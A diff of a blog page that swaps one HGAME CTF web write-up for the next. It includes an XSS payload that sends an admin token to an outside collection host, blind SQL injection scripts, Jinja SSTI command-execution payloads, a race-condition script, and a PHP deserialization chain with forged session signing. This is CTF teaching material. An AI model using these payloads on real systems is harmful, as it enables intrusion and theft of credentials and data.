@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">HGAME-Web-Week2WP | Troy3e</title>
+  <title itemprop="name">HGAME-Web-Week3WP | Troy3e</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -185,11 +185,11 @@
 
   <div class="pattern-center single-center">
     <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1128240.png);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1128240.png">
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1130193.jpg);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1130193.jpg">
     </div>
     <header class="pattern-header single-header">
       <h1 class="entry-title">
-      HGAME-Web-Week2WP</h1>
+      HGAME-Web-Week3WP</h1>
       <p class="entry-census">
         <span>
           <a href="">
@@ -201,7 +201,7 @@
         </span>
         <span class="bull">
         ·</span>
-        2021-2-13<span class="bull">
+        2021-2-20<span class="bull">
         ·</span>
       <span id="busuanzi_value_page_pv"></span>次阅读</p>
     </header>
@@ -215,133 +215,272 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <p>一、LazyDogR4U</p>
-<p><a href="http://www.zip源码泄露" target="_blank" rel="noopener">www.zip源码泄露</a></p>
-<p>一个session变量覆盖</p>
-<p>获取flag的条件：<br><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210207002347.png" alt></p>
-<p>继续看到flag.php包含的lazy.php</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210207002638.png" alt></p>
-<p>此代码自行理解，建议本地试一试。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210207003044.png" alt></p>
-<pre><code>hgame{R4U~|S-4~lazy-DoG}
-</code></pre><p>二、Post to zuckonit</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210208194730.png" alt></p>
-<p>经典xss，要获取管理员的token访问/flag。<br>找一个xss平台准备接收token<br>payload：</p>
-<pre><code>&lt;iframe srcdoc=。。。。。。。。。。&amp;#60;&amp;#115;&amp;#67;&amp;#82;&amp;#105;&amp;#80;&amp;#116;&amp;#32;&amp;#115;&amp;#82;&amp;#67;&amp;#61;&amp;#34;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#115;&amp;#58;&amp;#47;&amp;#47;&amp;#120;&amp;#115;&amp;#115;&amp;#46;&amp;#112;&amp;#116;&amp;#47;&amp;#87;&amp;#106;&amp;#52;&amp;#67;&amp;#34;&amp;#62;&amp;#60;&amp;#47;&amp;#115;&amp;#67;&amp;#114;&amp;#73;&amp;#112;&amp;#84;&amp;#62;&gt;
-</code></pre><p>xss就不解释了，一是姿势非常多，二是我自己也没怎么遇到过（啥也不会）</p>
-<p>payload准备好之后打给后台机器人就行，这里还有个验证码，python跑一个就行，网上嫖的脚本 稍微改了下（#py2）：</p>
-<pre><code>import hashlib
-import random
-
-def encryption(chars):
-     return hashlib.md5(chars).hexdigest()
-def generate():
-  code = &quot;&quot;
-  for i in range(5):
-      add_num = str(random.randrange(0,9))#纯数字
-      add_al = chr(random.randrange(65,91))#纯大写字母
-      add_str = str(random.randrange(0,9)) + chr    (random.randrange(65,91))#数字和字母
-      sj = random.choice([add_str])
-      code = &quot;&quot;.join([sj,code])
-  return code
-def main():
-     start = &quot;6a506f&quot; #指定前六位
-     while True:
-         strs = generate()
-         print &quot;Test %s &quot; % strs
-         if encryption(strs).startswith(start):
-             print &quot;yes!&quot;
-             print &quot;[+] %s &quot; % strs + &quot;%s &quot; % encryption(strs)
-         break
-         else:
-             print &quot;no!&quot;
-
-if __name__ == &#39;__main__&#39;:
-     main()
-     print &#39;完成！&#39;
-</code></pre><p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210208195933.png" alt></p>
-<p>拿到token，访问/flag</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210208200006.png" alt></p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210208200142.png" alt></p>
-<p>三、200OK!!</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210209120259.png" alt></p>
-<p>乍一看不知道是考的啥东西，抓个包康康（burp抓https教程自行百度）：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210209120429.png" alt></p>
-<p>在js脚本里面可以看到Status是随机生成的，在这里是一个可以控制的点，大概率存在sql注入。因为sql注入是寒假任务之一，所以我这里就一步一步写的细一点。</p>
-<p>首先测试闭合的方式，1’时无回显，1’#时有回显，所以是单引号型的。</p>
-<p>接下来我直接试了异或注入（记得加单引号，因为后台语句大概是这样的：select ‘(你的输入)’）：1’^’1’^’1’#</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210209121137.png" alt></p>
-<p>成功执行，存在异或注入。然后就是直接上二分法脚本了。</p>
-<p>我先放脚本：</p>
+          <p>一、Liki-Jail</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210215192601.png" alt></p>
+<p>只有一个登录框，输入啥都是返回相同的内容（除非有非法字符），初步猜测是时间盲注。</p>
+<p>第一步，测一下可用的字符：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210215192447.png" alt></p>
+<p>可以看到空格单引号都被过滤了，但是空格可以用/**/代替，单引号的话这里我用了转义符号，稍微解释一下：后台的语句大概是 select xxx from xxx where username=’Troy3e’ and password=’caibi’，这时，如果我们另username为Troy3e\，password为</p>
+<pre><code>/**/or/**/sleep(2)#
+</code></pre><p>那么原语句就变为</p>
+<pre><code>where username=&#39;Troy3e\&#39; and password=&#39;/**/or/**/sleep(2)#&#39;
+</code></pre><p>就相当于where username=’xxx’ or sleep(2)#，所以会延时两秒。</p>
+<p>接下来就是普通盲注的思路了，脚本如下：</p>
 <pre><code>import requests
+import datetime
+import time
 
 flag = &quot;&quot;
-url = &quot;https://200ok.liki.link/server.php&quot;
+url = &quot;https://jailbreak.liki.link/login.php&quot;
 for i in range(1,1000):
     l = 32
-    h = 132
+    h = 128
     mid = (l + h) // 2
     while(l&lt;h):
-        #payload = &quot;1&#39;^(ord(mid(database(),{0},1))&gt;{1})^&#39;1&#39;#&quot;.format(i, mid) #库名为 week2sqli
-        #payload = &quot;1&#39;^(ord(mid((selselectect(group_concat(table_name))frfromom(information_schema.tables)wwherehere(table_schema=&#39;week2sqli&#39;)),{0},1))&gt;{1})^&#39;1&#39;#&quot;.format(i, mid) #表名为f1111111144444444444g
-        #payload = &quot;1&#39;^(ord(mid((selselectect(group_concat(column_name))frfromom(information_schema.columns)wwherehere(table_name=&#39;f1111111144444444444g&#39;)),{0},1))&gt;{1})^&#39;1&#39;#&quot;.format(i, mid) #列名为ffffff14gggggg
-        payload = &quot;1&#39;^(ord(mid((selselectect(group_concat(ffffff14gggggg))frfromom(week2sqli.f1111111144444444444g)),{0},1))&gt;{1})^&#39;1&#39;#&quot;.format(i, mid) #列名为ffffff14gggggg
-
-        headers = {
-            &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0&#39;,
-            &#39;Status&#39;: payload
-        }
-        r = requests.get(url=url,headers=headers)
-        print(r.text)
-        if &#39;NETWORK ERROR&#39; in r.text:
+        name = &quot;admin\\&quot;
+        #payload = &quot;/**/or/**/if((ascii(substr(database(),{0},1)))&gt;{1},1,sleep(2))#&quot;.format(i,mid) #库名为week3sqli
+        #payload = &quot;/**/or/**/if((ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema/**/like/**/database())),{0},1))&gt;{1}),1,sleep(2))#&quot;.format(i,mid) #表名为u5ers
+        #payload = &quot;/**/or/**/if((ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name/**/like/**/0x7535657273)),{0},1))&gt;{1}),1,sleep(2))#&quot;.format(i,mid) #列名为usern@me,p@ssword
+        #payload = &quot;/**/or/**/if((ascii(substr((select(group_concat(`usern@me`))from(week3sqli.u5ers)),{0},1))&gt;{1}),1,sleep(2))#&quot;.format(i,mid) #用户名为admin
+        payload = &quot;/**/or/**/if((ascii(substr((select(group_concat(`p@ssword`))from(week3sqli.u5ers)),{0},1))&gt;{1}),1,sleep(2))#&quot;.format(i,mid) #密码为sOme7hiNgseCretw4sHidd3n
+        data = {&quot;username&quot;:name,&quot;password&quot;:payload}
+        time1 = datetime.datetime.now()
+        r = requests.post(url=url,data=data)
+        time2 = datetime.datetime.now()
+        sec = (time2 - time1).seconds
+        if sec&lt;=1:
             l = mid + 1
         else:
             h = mid
-        #if (mid == 32 or mid == 132):
-           # break
         mid = (l + h) // 2
     flag += chr(mid)
     print(flag)
 print(flag)
-</code></pre><p>二分法脚本做buu的应该都已经遇到过了，所以就不细说了。唯一要说明的就是双写绕过以及是如何判断waf的。</p>
-<p>在测试脚本的时候，我成功执行了第一个payload爆出了库名，于是直接进行了下一步爆表名，但是没有回显，测试payload如下：</p>
-<pre><code>payload = 1&#39;^(ord(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;week2sqli&#39;)),1,1))&gt;1)^&#39;1&#39;#
-</code></pre><p>照理说表名第一位的ascii码肯定大于一，所以这里应该返回NETWORK ERROR，但是却连200 OK都没有，所以肯定是语句存在问题了，而且是与第一个payload不一样的地方。</p>
-<p>于是得一个个地测试，这里我用了length来判断：1’^(length(‘select’)=0)^’1’#</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210209122031.png" alt></p>
-<p>返回NETWORK ERROR，说明select长度为0，这也就表示了后台把select替换为空，所以双写绕过即可。from和where原理同上</p>
-<p>hgame{Con9raTu1ati0n5+yoU_FXXK~Up-tH3,5Q1!!=)}</p>
-<p>四、Liki的生日礼物<br>这题找了好久不知道洞在哪，但是看solve数量那么多应该是个很简单的题，果然就是个竞争。python多线程同时买26张券即可。<br>脚本:</p>
-<pre><code>import requests
-import threading
+</code></pre><p>有三个小点讲一下：<br>1、等号=被过滤，我们可以使用like绕过。<br>2、等号后面的单引号被过滤，我们用十六进制代替。<br>3、usern@me和p@ssword加反引号的原因是@是mysql的特殊字，需要用反引号包围，否则跑不出来，可以自己试一下。</p>
+<p>拿到账号密码登录：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210215212219.png" alt></p>
+<pre><code>hgame{7imeB4se_injeCti0n+hiDe~th3^5ecRets}
+</code></pre><p>二、Forgetful</p>
+<p>一个非常简单的SSTI，一分钟就秒了。（不知道SSTI的务必百度自学一下，这个东西比赛很常见）</p>
+<p>之前NCTF的payload直接就打通了：<a href="https://troyess.com/2020/11/23/NCTF2020%E7%AD%BE%E5%88%B0%E6%91%B8%E9%B1%BC/" target="_blank" rel="noopener">https://troyess.com/2020/11/23/NCTF2020%E7%AD%BE%E5%88%B0%E6%91%B8%E9%B1%BC/</a></p>
+<p>查看目录：</p>
+<pre><code>{{""["\x5f\x5fcla"+"ss\x5f\x5f"]["\x5f\x5fm"+"ro\x5f\x5f"][1]["\x5f\x5fsub\x63lasses\x5f\x5f"]()[117]["\x5f\x5fin"+"it\x5f\x5f"]["\x5f\x5fglo"+"bals\x5f\x5f"]["popen"]("dir /")["read"]()}}
+</code></pre><p>尝试读取flag：</p>
+<pre><code>{{""["\x5f\x5fcl\x61ss\x5f\x5f"]["\x5f\x5fb\x61ses\x5f\x5f"][0]["\x5f\x5fsubcla" "sses\x5f\x5f"]()[166]["\x5f\x5fini\x74\x5f\x5f"]["\x5f\x5fglob\x61ls\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["eval"]("\x5f\x5fimport\x5f\x5f(\x27os\x27)\x2epopen(\x27cat /flag\x27)\x2eread()")}}
+</code></pre><p>返回”Stop!!!”，读取失败，测试多次后猜测只要直接返回了flag里的内容就会阻止你读取。<br>既然不能直接读，那就间接呗：</p>
+<pre><code>{{""["\x5f\x5fcl\x61ss\x5f\x5f"]["\x5f\x5fb\x61ses\x5f\x5f"][0]["\x5f\x5fsubcla" "sses\x5f\x5f"]()[166]["\x5f\x5fini\x74\x5f\x5f"]["\x5f\x5fglob\x61ls\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["eval"]("\x5f\x5fimport\x5f\x5f(\x27os\x27)\x2epopen(\x27cd ..;base64 flag\x27)\x2eread()")}}
+</code></pre><p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210215214103.png" alt></p>
+<pre><code>hgame{h0w_4bou7+L3arn!ng~PythOn^Now?}
+</code></pre><p>三、Post to zuckonit2.0 &amp; Post to zuckonit another version</p>
+<p>发生甚么事了</p>
+<p>四、Arknights</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210217115128.png" alt></p>
+<p>根据题目描述，本模拟器是用git搭建的，暗示存在git源码泄露。</p>
+<p>Githack获取源码：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210217120810.png" alt></p>
+<p>关键看simulator.php</p>
+<pre><code>&lt;?php
 
-def buyswitch(n):
-    url = &quot;https://birthday.liki.link/API/?m=buy&quot;
-    data = {&quot;amount&quot;: 26}
-    headers = {
-        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0&#39;,
-        &#39;Cookie&#39;: &#39;PHPSESSID=qdacrahf4gvn2o9q8aa4vm46jb&#39; #改成你自己的
+class Simulator{
+
+    public $session;
+    public $cardsPool;
+
+    public function __construct(){
+
+        $this-&gt;session = new Session();
+        if(array_key_exists(&quot;session&quot;, $_COOKIE)){
+            $this-&gt;session-&gt;extract($_COOKIE[&quot;session&quot;]);
+        }
+
+        $this-&gt;cardsPool = new CardsPool(&quot;./pool.php&quot;);
+        $this-&gt;cardsPool-&gt;init();
     }
-    r = requests.post(url=url,headers=headers,data=data)
-    print(&#39;线程&#39;+ str(n) + &#39;:&#39; + str(r.status_code) )
-    print (r.text)
+
+    public function draw($count){
+        $result = array();
+
+        for($i=0; $i&lt;$count; $i++){
+            $card = $this-&gt;cardsPool-&gt;draw();
+
+            if($card[&quot;stars&quot;] == 6){
+                $this-&gt;session-&gt;set(&#39;&#39;, $card[&quot;No&quot;]);
+            }
+
+            $result[] = $card;
+        }
+
+        $this-&gt;session-&gt;save();
+
+        return $result;
+    }
+
+    public function getLegendary(){
+        $six = array();
+
+        $data = $this-&gt;session-&gt;getAll();
+        foreach ($data as $item) {
+            $six[] = $this-&gt;cardsPool-&gt;cards[6][$item];
+        }
+
+        return $six;
+    }
+}
+
+class CardsPool
+{
+
+    public $cards;
+    private $file;
+
+    public function __construct($filePath)
+    {
+        if (file_exists($filePath)) {
+            $this-&gt;file = $filePath;
+        } else {
+            die(&quot;Cards pool file doesn&#39;t exist!&quot;);
+        }
+    }
+
+    public function draw()
+    {
+        $rand = mt_rand(1, 100);
+        $level = 0;
+
+        if ($rand &gt;= 1 &amp;&amp; $rand &lt;= 42) {
+            $level = 3;
+        } elseif ($rand &gt;= 43 &amp;&amp; $rand &lt;= 90) {
+            $level = 4;
+        } elseif ($rand &gt;= 91 &amp;&amp; $rand &lt;= 99) {
+            $level = 5;
+        } elseif ($rand == 100) {
+            $level = 6;
+        }
+
+        $rand_key = array_rand($this-&gt;cards[$level]);
+
+        return array(
+            &quot;stars&quot; =&gt; $level,
+            &quot;No&quot; =&gt; $rand_key,
+            &quot;card&quot; =&gt; $this-&gt;cards[$level][$rand_key]
+        );
+    }
+
+    public function init()
+    {
+        $this-&gt;cards = include($this-&gt;file);
+    }
+
+    public function __toString(){
+        return file_get_contents($this-&gt;file);
+    }
+}
 
 
-def thread(n):
-    threads = []
-    for i in range(0, n):
-        t = threading.Thread(target=buyswitch, args=(i,))
-        threads.append(t)
-    print(threads)
+class Session{
 
-    for t in threads:
-        t.start()
-    for t in threads:
-        t.join()
+    private $sessionData;
 
-thread(2)
-</code></pre><p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210208225903.png" alt></p>
-<pre><code>hgame{L0ck_1s_TH3_S0lllut!on!!!}
+    const SECRET_KEY = &quot;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&quot;;
+
+    public function __construct(){}
+
+    public function set($key, $value){
+        if(empty($key)){
+            $this-&gt;sessionData[] = $value;
+        }else{
+            $this-&gt;sessionData[$key] = $value;
+        }
+    }
+
+    public function getAll(){
+        return $this-&gt;sessionData;
+    }
+
+
+    public function save(){
+
+        $serialized = serialize($this-&gt;sessionData);
+        $sign = base64_encode(md5($serialized . self::SECRET_KEY));
+        $value = base64_encode($serialized) . &quot;.&quot; . $sign;
+
+        setcookie(&quot;session&quot;,$value);
+    }
+
+
+    public function extract($session){
+
+        $sess_array = explode(&quot;.&quot;, $session);
+        $data = base64_decode($sess_array[0]);
+        $sign = base64_decode($sess_array[1]);
+
+        if($sign === md5($data . self::SECRET_KEY)){
+            $this-&gt;sessionData = unserialize($data);
+        }else{
+            unset($this-&gt;sessionData);
+            die(&quot;Go away! You hacker!&quot;);
+        }
+    }
+}
+
+
+class Eeeeeeevallllllll{
+    public $msg=&quot;坏坏liki到此一游&quot;;
+
+    public function __destruct()
+    {
+        echo $this-&gt;msg;
+    }
+}
+</code></pre><p>首先找到获取flag的点：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210217121406.png" alt></p>
+<p>有一个tostring魔法函数和file_get_contents函数，那么只要我们能控制file变量以及能够触发tostring函数，就可以读取flag.php。</p>
+<p>这时注意到最后出题人留下的痕迹：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210217121724.png" alt></p>
+<p>有一个echo，很明显是让你触发tostring的，所以只要令msg new一个类即可触发tostring，但是new哪一个类呢？肯定是能让我们控制file变量的CardsPool类了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210217122308.png" alt></p>
+<p>记得file前面一定改为public。。。private打不通，原因可能是%00在后面base64编码和md5加密的时候会出问题，可能是这样。</p>
+<p>好的现在成功构造了pop链，但是没有反序列化点的话，都是徒劳的，也就是说还没有一个触发点。</p>
+<p>Session类里有一个反序列化，能不能利用呢：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210217122616.png" alt></p>
+<p>可以看到data就是我们session前半部分base64解码后的结果，所以说，是可控的。但是上面还有一个触发的条件，懒得细说了，上面secretkey已经给出，很好伪造，这里把脚本贴出来：</p>
+<pre><code>&lt;?php
+highlight_file(__FILE__);
+class test
+{
+     const SECRET_KEY = &quot;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&quot;;
+     public $data;
+     function __destruct(){
+        $payload=&#39;O:17:&quot;Eeeeeeevallllllll&quot;:1:{s:3:&quot;msg&quot;;O:9:&quot;CardsPool&quot;:1:{s:4:&quot;file&quot;;s:10:&quot;./flag.php&quot;;}}&#39;;
+        $sign=base64_encode(md5($payload . self::SECRET_KEY));
+        echo &#39;&lt;br/&gt;&#39;;
+        echo $sign;
+        echo &#39;&lt;br/&gt;&#39;;
+        $key=base64_encode($payload);
+        echo $key;
+        echo &#39;&lt;br/&gt;&#39;;
+        $value = base64_encode($payload) . &quot;.&quot; . $sign;
+        $sess_array = explode(&quot;.&quot;, $value);
+        echo &#39;&lt;br/&gt;&#39;;
+        echo base64_decode($sess_array[0]);
+        echo &#39;&lt;br/&gt;&#39;;
+        echo base64_decode($sess_array[1]);
+        echo &#39;&lt;br/&gt;&#39;;
+        $a = base64_decode($sess_array[0]);
+        $b = base64_decode($sess_array[1]);
+        if($b === md5($a . self::SECRET_KEY)){
+            echo &quot;success&quot;;
+            echo &#39;&lt;br/&gt;&#39;;
+        }
+        echo $value;
+     }
+ }
+ $a=new test();
+?&gt; 
+</code></pre><p>脚本比较啰嗦，懒得改了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210217123207.png" alt></p>
+<p>将得到的payload放到session里面发送即可得到flag</p>
+<pre><code>hgame{XI-4Nd-n!AN-D0e5Nt_eX|5T~4t_ALL}
 </code></pre>
         </div>
         <!-- .entry-content -->
@@ -373,15 +512,15 @@ thread(2)
           
             <div class="post-nepre half previous">
           
-            <a href="/2021/02/20/HGAME-Web-Week3WP/" rel="prev">
+            <a href="/2077/12/10/Self-Introduction/" rel="prev">
               <div class="background">
-                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1130193.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1130193.jpg">
+                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-994291.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-994291.png">
               </div>
               <span class="label">
               Previous Post</span>
               <div class="info">
                 <h3>
-                HGAME-Web-Week3WP</h3>
+                Self-Introduction（置顶）</h3>
                 <hr>
               </div>
             </a>
@@ -391,15 +530,15 @@ thread(2)
           
             <div class="post-nepre half next">
           
-            <a href="/2021/02/06/PwnThyBytes-2019-Baby-SQL/" rel="next">
+            <a href="/2021/02/13/HGAME-Web-Week2WP/" rel="next">
               <div class="background">
-                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1128093.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1128093.jpg">
+                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1128240.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1128240.png">
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                [PwnThyBytes 2019]Baby_SQL</h3>
+                HGAME-Web-Week2WP</h3>
                 <hr>
               </div>
             </a>
